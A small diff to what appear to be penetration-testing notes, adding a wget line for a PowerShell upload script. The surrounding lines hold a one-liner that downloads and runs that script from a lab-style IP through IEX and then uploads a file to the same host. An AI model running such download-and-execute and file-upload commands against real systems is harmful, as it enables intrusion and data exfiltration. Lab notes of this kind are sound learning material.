@@ -790,6 +790,7 @@ ascii
 https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
 ```bash
 #powershell
+wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PSUpload.ps1');Invoke-FileUpload -Uri http://10.10.14.37/upload -File 
 
 # linux
